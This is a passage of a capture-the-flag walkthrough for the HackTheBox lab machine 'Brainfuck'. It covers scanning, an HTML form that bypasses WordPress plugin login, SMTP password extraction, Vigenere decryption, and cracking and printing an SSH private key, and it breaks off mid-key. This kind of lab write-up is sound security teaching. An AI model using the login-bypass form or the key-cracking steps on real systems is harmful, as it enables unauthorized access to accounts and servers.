---
tags:
  - smtp
  - responsive-ticket
  - vigenere
  - rsa_decrypt
  - lxc_privesc
  - lxd_privesc
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/391b0f0a41832d21577824602f02b177.png)

- Machine : https://app.hackthebox.com/machines/Brainfuck
- Reference : https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html
- Solved : 2025.2.23. (Sun) (Takes 1day)

## Summary
---

1. **Initial Reconnaissance**
    - **Open Ports**: 22 (SSH), 25 (SMTP), 110 (POP3), 143 (IMAP), 443 (HTTPS).
    - **Domain Discovery**: `brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb` found via SSL certificate.
    - **Web Enumeration**:
        - `brainfuck.htb` runs **WordPress**.
        - `sup3rs3cr3t.brainfuck.htb` exposes usernames: `admin`, `orestis`.
        - **WordPress Plugin Exploit**: Found `wp-support-plus-responsive-ticket-system` vulnerable to privilege escalation.
    
2. **Web Exploitation**
    - **Privilege Escalation via WordPress Plugin**:
        - Used a crafted HTML form to log in as `admin` without credentials.
        - Gained access to WordPress **Admin Panel**.
    - **SMTP Plugin Credential Leak**:
        - Extracted **SMTP credentials** from "Easy WP SMTP" settings.
        - Found `orestis:kIEnnfEKJ#9UmdO` in **Evolution Mail**.
    
3. **User Shell as `orestis`**
    - **SSH Access**:
        - Unable to log in directly via SSH using SMTP credentials.
    - **Alternative Access**:
        - Discovered an encrypted **SSH private key** via internal messages.
        - Decrypted **Vigenere Cipher** messages to reveal RSA key URL.
        - Downloaded **id_rsa**, cracked passphrase using `John the Ripper`.
        - Used the **decrypted RSA key** to log in as `orestis`.
    
4. **Privilege Escalation**
    - **Root Flag Extraction**:
        - Found `encrypt.sage` script encrypting `/root/root.txt` using **RSA**.
        - Used `debug.txt` values (p, q, e) to compute **private key (d)**.
        - Decrypted `output.txt`, revealing **root flag**.
    - **Alternative: LXC Privilege Escalation**:
        - `orestis` was in the `lxd` group.
        - Created a **privileged LXC container**, mounted root filesystem.
        - Gained root shell by accessing `/r/root/root.txt`.

### Key Techniques:

- **WordPress Plugin Exploit**: Used for privilege escalation to admin.
- **SMTP Credential Leak**: Allowed access to internal emails.
- **Vigenere Cipher**: Used to uncover the private key URL.
- **RSA Decryption**: Recovered **root.txt** via mathematical attack.
- **LXC Privilege Escalation**: Exploited `lxd` group membership for root shell.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.17
Performing quick port scan on 10.10.10.17...
Found open ports: 22,25,110,143,443
Performing detailed scan on 10.10.10.17...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 16:31 MST
Nmap scan report for 10.10.10.17
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING SASL(PLAIN) RESP-CODES CAPA USER UIDL AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: OK SASL-IR Pre-login more LITERAL+ post-login capabilities IMAP4rev1 AUTH=PLAINA0001 listed IDLE LOGIN-REFERRALS have ID ENABLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Welcome to nginx!
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.22 seconds
```

5 ports are open : ssh(22), smtp(25), pop3(110), imap(143), https(443)
According to the port 443 scanning result, there's a domain name : brainfuck.htb

### https(443)

##### brainfuck.htb

![](attachments/brainfuck_1.png)

![](attachments/brainfuck_10.png)

I think that we need to investigate SMTP protocol later once after getting `orestis`'s account.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ gobuster dir -u https://brainfuck.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k --timeout 300s      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://brainfuck.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 5m0s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-content/]                                                                   
/wp-includes          (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-includes/]   
/wp-admin             (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-admin/] 
```

Given the found pages, it seems that wordpress is running.

##### sup3rs3cr3t.brainfuck.htb

![](attachments/brainfuck_3.png)

![](attachments/brainfuck_4.png)

There are two usernames found : `admin`, `orestis`

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ gobuster dir -u https://sup3rs3cr3t.brainfuck.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k --exclude-length 21
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://sup3rs3cr3t.brainfuck.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          21
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 500) [Size: 151799]
/register             (Status: 500) [Size: 151802]
/uploads              (Status: 301) [Size: 194] [--> https://sup3rs3cr3t.brainfuck.htb/uploads/]
/scripts              (Status: 301) [Size: 194] [--> https://sup3rs3cr3t.brainfuck.htb/scripts/]
/assets               (Status: 301) [Size: 194] [--> https://sup3rs3cr3t.brainfuck.htb/assets/]
/all                  (Status: 200) [Size: 6741]
/storage              (Status: 301) [Size: 194] [--> https://sup3rs3cr3t.brainfuck.htb/storage/]
/tags                 (Status: 200) [Size: 5094]
/logout               (Status: 302) [Size: 0] [--> https://sup3rs3cr3t.brainfuck.htb]
/vendor               (Status: 301) [Size: 194] [--> https://sup3rs3cr3t.brainfuck.htb/vendor/]
/LICENSE              (Status: 200) [Size: 1083]
```

I visited all sub pages, but most of them were not valid.



# wp-login as `admin`

### Bypass authentication via Responstive-Ticket-System

Let's run `wpscan`.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ wpscan --url https://brainfuck.htb --disable-tls-checks --api-token $(cat /opt/wpscan/api_token.txt)
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Sat Feb 22 16:56:34 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>


<SNIP>

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
 |      - https://www.exploit-db.com/exploits/40939/
 |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
 |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
 |      - https://plugins.trac.wordpress.org/changeset/1763596
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection
 |     Fixed in: 9.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131
 |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md
 |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 9.1.2 - Stored XSS
 |     Fixed in: 9.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331
 |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/
 |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
 |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
 |      - https://packetstormsecurity.com/files/140413/
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
```

Based on the wpscan result, there's `wp-support-plus-responsive-ticket-system` plugin, and it has vulnerabilities.
Especially, the last one looks critical once I have a valid username.

![](attachments/brainfuck_5.png)

```html
<form method="post" action="http://example.com/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Since I don't have any valid username for now, let's move on.

Instead, let's use the found username with wpscan found vulnerability.
Let's save the following as a html file and open it.

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
  Username: <input type="text" name="username" value="administrator">
  <input type="hidden" name="email" value="sth">
  <input type="hidden" name="action" value="loginGuestFacebook">
  <input type="submit" value="Login">
</form>
```

![](attachments/brainfuck_6.png)

After a while, it loads an empty page, but when I refresh the main page, it shows that I'm signed in as `orestis`.

![](attachments/brainfuck_8.png)

![](attachments/brainfuck_9.png)

However, it seems that `orestis` is just a normal user which doesn't have admin permission.
Let's try again with `admin` account.

![](attachments/brainfuck_7.png)

Then I got to wp-admin panel.

![](attachments/brainfuck_11.png)

### SMTP Plugin

I immediately checked 'Theme Editor' to modify php files, but it says the files are not writable.
So I changed my view to Editor for plugin.

![](attachments/brainfuck_12.png)

Unluckily, the plugin editor is neither editable.
Instead, let's take a look at "Installed plugins".

![](attachments/brainfuck_13.png)

Here I can see multiple plugins. Among them, "Easy WP SMTP" caught my attention since I saw a note that there was an integration of SMTP.
Let's click "Settings" of the plugin.

![](attachments/brainfuck_14.png)

It is something! It stores `orestis`'s SMTP settings including password while it's redacted.
I can easily fetch the plaintext of the redacted password.

![](attachments/brainfuck_15.png)

```html
<input type="password" name="swpsmtp_smtp_password" value="kHGuERB29DNiNE">
```

The SMTP service password for `orestis` is `kHGuERB29DNiNE`.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ ssh orestis@brainfuck.htb
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
ED25519 key fingerprint is SHA256:R2LI9xfR5z8gb7vJn7TAyhLI9RT5GEVp76CK9aoKnM8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brainfuck.htb' (ED25519) to the list of known hosts.
orestis@brainfuck.htb: Permission denied (publickey).
```

I checked ssh with the found credential, but it didn't work.
Instead, let's use **Evolution** to communicate with SMTP protocol.

Let's setup an account first.

![](attachments/brainfuck_16.png)

![](attachments/brainfuck_17.png)

![](attachments/brainfuck_18.png)

Then, let's check Inbox.

![](attachments/brainfuck_19.png)

![](attachments/brainfuck_20.png)

Still don't know what the password for `admin`, and it mentions the password for `orestis` : `kIEnnfEKJ#9UmdO`. Which is slightly different from what we found before.
`
Given the message, it seems that I can use the same credential on **sup3rs3cr3t.brainfuck.htb** page.
The credential works, and I can see the discussions for `orestis`.

![](attachments/brainfuck_21.png)

![](attachments/brainfuck_22.png)

Even though the title is "Key", cannot read any of the chat since they are not readable.
I tested ROT13, ROT47, but none of them worked.

![](attachments/brainfuck_23.png)

It's telling me why SSH connection was not working.
And I think the encrypted key is the chat we've seen before.
Also, one more observation is "Orestis - Hacking for fun and profit" is always appended at the every end of the messages.
If that goes along with the messages of encrypted messages, the key or encryption method changes every time.

![](attachments/brainfuck_24.png)

Not a meaningful chat.

# Shell as `orestis`

### Vigenere Cipher

At this moment, I can try different methods to decrypt the key.
This seems to be a **Vigenere Cipher**.

The first thing I have to do for crack is extracting its key.

```python
>>> en = "Pieagnm - Jkoijeg nbw zwx mle grwsnn"
>>> pl = "Orestis - Hacking for fun and profit"
>>> list(zip(en, pl))
[('P', 'O'), ('i', 'r'), ('e', 'e'), ('a', 's'), ('g', 't'), ('n', 'i'), ('m', 's'), (' ', ' '), ('-', '-'), (' ', ' '), ('J', 'H'), ('k', 'a'), ('o', 'c'), ('i', 'k'), ('j', 'i'), ('e', 'n'), ('g', 'g'), (' ', ' '), ('n', 'f'), ('b', 'o'), ('w', 'r'), (' ', ' '), ('z', 'f'), ('w', 'u'), ('x', 'n'), (' ', ' '), ('m', 'a'), ('l', 'n'), ('e', 'd'), (' ', ' '), ('g', 'p'), ('r', 'r'), ('w', 'o'), ('s', 'f'), ('n', 'i'), ('n', 't')]
>>> [chr((ord(e) - ord(p)) % 26 + ord('a')) for e, p in list(zip(en, pl))]
['b', 'r', 'a', 'i', 'n', 'f', 'u', 'a', 'a', 'a', 'c', 'k', 'm', 'y', 'b', 'r', 'a', 'a', 'i', 'n', 'f', 'a', 'u', 'c', 'k', 'a', 'm', 'y', 'b', 'a', 'r', 'a', 'i', 'n', 'f', 'u']
```

From this, I can guess that the key is "FUCKMYBRAIN" or rotation of it.
Then, I used the following website to crack : https://www.dcode.fr/vigenere-cipher

![](attachments/brainfuck_25.png)

It worked! The decrypted whole messages are as follows;

```
Orestis:
Hey give me the url for my key bitch :)  
Orestis - Hacking for fun and profit

Admin:
Say please and i just might do so...

Orestis:
Pleeeease....  
Orestis - Hacking for fun and profit

Admin:
There you go you stupid fuck, I hope you remember your key password because I dont :)
https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

Orestis:
No problem, I'll brute force it ;)  
Orestis - Hacking for fun and profit
```

Here it contains an URL for the RSA key :
https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

Let's download and check how the key looks like.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ wget https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
--2025-02-23 02:17:24--  https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
Resolving brainfuck.htb (brainfuck.htb)... 10.10.10.17
Connecting to brainfuck.htb (brainfuck.htb)|10.10.10.17|:443... connected.
WARNING: The certificate of ‘brainfuck.htb’ is not trusted.
WARNING: The certificate of ‘brainfuck.htb’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘brainfuck.htb’
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa              100%[================>]   1.72K  --.-KB/s    in 0s      

2025-02-23 02:17:24 (16.8 MB/s) - ‘id_rsa’ saved [1766/1766]



┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ ls
id_rsa  ticket-poc.html



┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ cat id_rsa       
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

### Crack RSA key

Then, let's extract and crack the hash.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ ssh2john id_rsa > id_rsa.hash                                        


┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ cat id_rsa.hash                                        
id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190


┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)     
1g 0:00:00:02 DONE (2025-02-23 02:37) 0.3367g/s 4195Kp/s 4195Kc/s 4195KC/s 3poulakia!..3pornuthin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The cracked passphrase for the RSA private key is `3poulakia!`.
Using this passphrase, I can extract RSA private key without encryption.

```bash
┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ openssl rsa -in id_rsa -out id_rsa.priv
Enter pass phrase for id_rsa:
writing RSA key


┌──(kali㉿kali)-[~/htb/brainfuck]
└─$ cat id_rsa.priv    
-----BEGIN PRIVATE KEY-----
MIIEwAIBADANBgkqhkiG9w0BAQEFAASCBKowggSmAgEAAoIBAQDVHR+sCymklT6g
oUsFFNkD+sHaYZN23RVY3iD7B2d/q5Zfc96ONky2WoVqxtPwX2QsHYBkxdgWGc0N
Uqg1mU7zjiwxNxNUvuhl5+WyX7Wo9kzWNfzS69qNHfsCn5AN0GktrNms9tsbsB/P
1PIDdVDxgUzIoYa2eypUOrEqc16occrkgKE+ZmvgxoU29k28Z8guqc/jxaF+r1Nr
KUOJgmVqk7G0bKJnesem3yKgKtnfC9YY5sd+wATRWgPhKOOUWXltwkMLU6cAXD1v
s6TQxamR1qbpc2XHeaVaNTd1EtM9ju1tQrjfzVVMrW+Fl33qaE/WCXEzR/1XcT9r
6YXSiG0ZAgMBAAECggEBAIrH2nY5Frc9EXmdT7NRbjlvNIo3/MXtFxe2H5gZrEax
wM0MMaQ+rBocPMHaFO510FACLjhxtlQ+HRBOAYhV+9oTfafXC9mmMMUcDLLqLOyI
6GSe57ObL8mx+mIs8qxsSfIam+5NG0aenTjEnY2u+jUrVIta1NVEw73yMqlIVB4w
OzHy9XrBqidjF6kTDN0ESF9gv+5TbvX1wy9Y1ZY9896jKYaSx7Rt3Js9hRQ1EYxp
AFs7YX86Ol0xEH1YYorW289HtvvIgH+LcBAaZ7lFHs4qzFANAIyseWEShmK8Wf97
0+6G2VeFiz9FOjRGjg1nGjvPZZ8PxnQS8Du0/B8OjvkCgYEA+9xVVlCr9lZ4509l
w5iHObrd4ujzr3xF6VW2NbqRvlKMDkyBevz1uKmtvs0DS5shEEwaHGycPk8PwHXu
CSN5ZmkVRYLrIjtBI/LNxxK7Jm+ZImrCKHtjUb5wvNOuJ4KYY0s+cCjhGrVpoA/u
Cg3sXcQU3qUwdpvvi38mGh5DagcCgYEA2J3EuS5ZK+jUonlt+idr3fsyqJdrFsVz
nedC9xFkpjPbM30/P/2E8cIYiul938+OgzdeZrKG3Av0+twUI+btcmRgjp0CiDNk
mCo8sCscbEvMtWmtk6oKRPywuTjlhjF7CTBiXSSUkERpe8jqTi31p8raOxuGpMkO
APPYnsAYJ98CgYEA3jsdJWtLQLIuPlOlhH/6marUDFrmYmpyOaAChcgYv2mQ4TEK
ct3vZ0B46Ul2Zej8tKehxoDjIGuch4LHRVMC1KVWOp55IRxNrw2YGtbhQdnosiCn
LxconMFAMq1JFt253qtO7aJ0dZ+rEqvbqw18CYRxsb7qU03mgRzxHsyjSVMCgYEA
nqU9tNpLGKuXP79rWnCQwaz99xeeqLjH6ne7RbQJYOhNvDIYpscIHP+odeR3+fjL
STK+ArzxpCtlqmyQm5K/iK4XQZughRwOqpsUg3mvgWkqbhsNsz4v80KWM7GF+Hg4
